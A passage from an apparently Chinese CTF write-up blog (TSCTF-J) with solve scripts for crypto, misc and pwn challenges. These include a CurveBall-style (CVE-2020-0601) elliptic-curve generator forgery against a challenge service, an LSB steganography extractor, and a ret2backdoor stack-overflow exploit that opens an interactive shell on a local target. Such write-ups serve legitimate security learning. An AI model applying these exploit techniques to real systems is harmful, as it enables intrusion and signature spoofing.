class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">1_000_003</span>  <span class="comment"># large prime, works for Gaussian elimination</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_gauss_mod</span>(<span class="params">mat, rhs, mod</span>):</span><br><span class="line">  n = <span class="built_in">len</span>(mat)</span><br><span class="line">  aug = [row[:] + [rhs[i] % mod] <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(mat)]</span><br><span class="line">  row = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      pivot = <span class="built_in">next</span>((r <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(row, n) <span class="keyword">if</span> aug[r][col] % mod), <span class="literal">None</span>)</span><br><span class="line">      <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      aug[row], aug[pivot] = aug[pivot], aug[row]</span><br><span class="line">      inv = <span class="built_in">pow</span>(aug[row][col], -<span class="number">1</span>, mod)</span><br><span class="line">      aug[row] = [(val * inv) % mod <span class="keyword">for</span> val <span class="keyword">in</span> aug[row]]</span><br><span class="line">      <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">          <span class="keyword">if</span> r != row <span class="keyword">and</span> aug[r][col] % mod:</span><br><span class="line">              factor = aug[r][col] % mod</span><br><span class="line">              aug[r] = [(aug[r][c] - factor * aug[row][c]) % mod <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>)]</span><br><span class="line">      row += <span class="number">1</span></span><br><span class="line">  sol = [<span class="number">0</span>] * n</span><br><span class="line">  <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      leading = <span class="built_in">next</span>((c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n) <span class="keyword">if</span> aug[r][c] % mod), <span class="literal">None</span>)</span><br><span class="line">      <span class="keyword">if</span> leading <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">          sol[leading] = aug[r][-<span class="number">1</span>] % mod</span><br><span class="line">  <span class="keyword">return</span> sol</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;challenge.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(lines[<span class="number">0</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">k = <span class="built_in">int</span>(lines[<span class="number">2</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">vals = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, lines[<span class="number">4</span>:]))</span><br><span class="line"></span><br><span class="line">ciphertexts = vals[:<span class="number">2</span> * k]</span><br><span class="line">raws = vals[<span class="number">2</span> * k:]</span><br><span class="line">n2 = n * n</span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> c, raw <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertexts, raws):</span><br><span class="line">  r = raw % n</span><br><span class="line">  rn = <span class="built_in">pow</span>(r, n, n2)</span><br><span class="line">  gm = (c * <span class="built_in">pow</span>(rn, -<span class="number">1</span>, n2)) % n2</span><br><span class="line">  y.append((gm - <span class="number">1</span>) // n)</span><br><span class="line"></span><br><span class="line">mat, rhs = [], []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">  mat.append([y[i + k - <span class="number">1</span> - j] % MOD <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k)])</span><br><span class="line">  rhs.append(y[k + i] % MOD)</span><br><span class="line"></span><br><span class="line">coeffs = solve_gauss_mod(mat, rhs, MOD)</span><br><span class="line">value = <span class="built_in">sum</span>(d * <span class="built_in">pow</span>(<span class="number">3</span>, i) <span class="keyword">for</span> i, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(coeffs))</span><br><span class="line">flag = long_to_bytes(value)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{We_sh0u1d_kn0w!}</p><h3 id="Microsoft’s-gifts"><a href="#Microsoft’s-gifts" class="headerlink" title="Microsoft’s gifts"></a>Microsoft’s gifts</h3><p>deepseek立大功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># secp256r1曲线参数</span></span><br><span class="line">p = <span class="number">0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF</span></span><br><span class="line">a = <span class="number">0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC</span></span><br><span class="line">b = <span class="number">0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B</span></span><br><span class="line">n = <span class="number">0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EllipticCurve</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a: <span class="built_in">int</span>, b: <span class="built_in">int</span>, p: <span class="built_in">int</span>, g: <span class="built_in">tuple</span>, name: <span class="built_in">str</span> = <span class="string">&quot;secp256r1&quot;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.p = p</span><br><span class="line">        <span class="variable language_">self</span>.g = g</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_on_curve</span>(<span class="params">self, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        x, y = point</span><br><span class="line">        <span class="keyword">return</span> (y * y - x * x * x - <span class="variable language_">self</span>.a * x - <span class="variable language_">self</span>.b) % <span class="variable language_">self</span>.p == <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, p1: <span class="built_in">tuple</span>, p2: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> p1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> p2</span><br><span class="line">        <span class="keyword">if</span> p2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> p1</span><br><span class="line">        x1, y1 = p1</span><br><span class="line">        x2, y2 = p2</span><br><span class="line">        <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> y1 != y2:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> x1 == x2:</span><br><span class="line">            m = (<span class="number">3</span> * x1 * x1 + <span class="variable language_">self</span>.a) * inverse(<span class="number">2</span> * y1, <span class="variable language_">self</span>.p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m = (y1 - y2) * inverse(x1 - x2, <span class="variable language_">self</span>.p)</span><br><span class="line">        m %= <span class="variable language_">self</span>.p</span><br><span class="line">        x3 = (m * m - x1 - x2) % <span class="variable language_">self</span>.p</span><br><span class="line">        y3 = (y1 + m * (x3 - x1)) % <span class="variable language_">self</span>.p</span><br><span class="line">        y3 = (-y3) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">multiply</span>(<span class="params">self, k: <span class="built_in">int</span>, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.multiply(-k, <span class="variable language_">self</span>.negate(point))</span><br><span class="line">        result = <span class="literal">None</span></span><br><span class="line">        addend = point</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">                result = <span class="variable language_">self</span>.add(result, addend)</span><br><span class="line">            addend = <span class="variable language_">self</span>.add(addend, addend)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">negate</span>(<span class="params">self, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        x, y = point</span><br><span class="line">        <span class="keyword">return</span> (x, (-y) % <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 连接到题目服务</span></span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">61018</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收公钥</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;public key is &#x27;</span>)</span><br><span class="line">    pub_str = r.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received public key: <span class="subst">&#123;pub_str&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析公钥 - 处理带引号的十六进制字符串</span></span><br><span class="line">    pub_str = pub_str.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    x_str, y_str = pub_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    x_p = <span class="built_in">int</span>(x_str, <span class="number">16</span>)</span><br><span class="line">    y_p = <span class="built_in">int</span>(y_str, <span class="number">16</span>)</span><br><span class="line">    public_key = (x_p, y_p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Parsed public key: (<span class="subst">&#123;<span class="built_in">hex</span>(x_p)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(y_p)&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建曲线对象</span></span><br><span class="line">    curve = EllipticCurve(a, b, p, <span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算2的逆元 (mod n)</span></span><br><span class="line">    inv2 = inverse(<span class="number">2</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;inverse of 2 mod n: <span class="subst">&#123;<span class="built_in">hex</span>(inv2)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算公钥的一半作为新的基点G</span></span><br><span class="line">    G_half = curve.multiply(inv2, public_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;New base point G: (<span class="subst">&#123;<span class="built_in">hex</span>(G_half[<span class="number">0</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(G_half[<span class="number">1</span>])&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证新基点是否在曲线上</span></span><br><span class="line">    <span class="keyword">if</span> curve.is_on_curve(G_half):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;New base point is on curve ✓&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: New base point is not on curve!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送曲线参数</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your curve now: [p, a, b]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;[<span class="subst">&#123;p&#125;</span>, <span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>]&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent curve parameters&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送基点G</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your g which is on the curve: [gx, gy]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;[<span class="subst">&#123;G_half[<span class="number">0</span>]&#125;</span>, <span class="subst">&#123;G_half[<span class="number">1</span>]&#125;</span>]&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent base point G&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送私钥</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your private_key: key&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent private key: 2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收结果</span></span><br><span class="line">    result = r.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试接收更多输出（比如flag）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = r.recvline(timeout=<span class="number">2</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013101730857.png" alt="image-20251013101730857"></p><p>TSCTF-J{Microsoft-CVE-2020-0601}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>TSCTF-J{Th4nk5_F0r_Y0ur_4ttend1n9}</p><h3 id="卢森堡的秘密"><a href="#卢森堡的秘密" class="headerlink" title="卢森堡的秘密"></a>卢森堡的秘密</h3><p>图片binwalk -e secret.png 发现有zip</p><p>提出来的时候失败了</p><p>万能的AI给了个神奇的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, zlib</span><br><span class="line"></span><br><span class="line">w, h, bpp = <span class="number">1920</span>, <span class="number">1607</span>, <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paeth</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    p = a + b - c</span><br><span class="line">    pa, pb, pc = <span class="built_in">abs</span>(p - a), <span class="built_in">abs</span>(p - b), <span class="built_in">abs</span>(p - c)</span><br><span class="line">    <span class="keyword">if</span> pa &lt;= pb <span class="keyword">and</span> pa &lt;= pc:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span> pb &lt;= pc:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">assert</span> f.read(<span class="number">8</span>) == <span class="string">b&quot;\x89PNG\r\n\x1a\n&quot;</span></span><br><span class="line">    idat = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        length, ctype = struct.unpack(<span class="string">&quot;&gt;I4s&quot;</span>, f.read(<span class="number">8</span>))</span><br><span class="line">        data, crc = f.read(length), f.read(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ctype == <span class="string">b&quot;IDAT&quot;</span>:</span><br><span class="line">            idat += data</span><br><span class="line">        <span class="keyword">elif</span> ctype == <span class="string">b&quot;IEND&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">raw = zlib.decompress(idat)</span><br><span class="line">stride, prev, pixels, off = w * bpp, [<span class="number">0</span>] * (w * bpp), [], <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    ftype = raw[off]</span><br><span class="line">    row = <span class="built_in">bytearray</span>(raw[off + <span class="number">1</span>:off + <span class="number">1</span> + stride])</span><br><span class="line">    <span class="keyword">if</span> ftype == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            row[i] = (row[i] + (row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            row[i] = (row[i] + prev[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            left = row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            up = prev[i]</span><br><span class="line">            row[i] = (row[i] + ((left + up) &gt;&gt; <span class="number">1</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            left = row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            up = prev[i]</span><br><span class="line">            up_left = prev[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            row[i] = (row[i] + paeth(left, up, up_left)) &amp; <span class="number">0xFF</span></span><br><span class="line">    pixels.extend(row)</span><br><span class="line">    prev, off = <span class="built_in">list</span>(row), off + stride + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bits = [p &amp; <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> pixels]</span><br><span class="line">msg = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">    byte = <span class="number">0</span></span><br><span class="line">    chunk = bits[i:i + <span class="number">8</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> chunk:</span><br><span class="line">        byte = (byte &lt;&lt; <span class="number">1</span>) | b</span><br><span class="line">    <span class="keyword">if</span> byte == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    msg.append(byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(msg.decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{Th3_sEcre7_0f_L$B!}</p><h3 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h3><p>解压meow.zip得到<strong>xml</strong>里面有base64码表</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011183403149.png" alt="image-20251011183403149"></p><p>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h3><p>超级入门题，直接ret2backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># pwnfile = &#x27;../toolcode/libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">50262</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../toolcode/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># rop = ROP(pwnfile)</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span> + <span class="number">0x8</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;sign-in!&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(<span class="number">0x400676</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011140426789.png" alt="image-20251011140426789"></p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>利用溢出打pop ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE</span><br><span 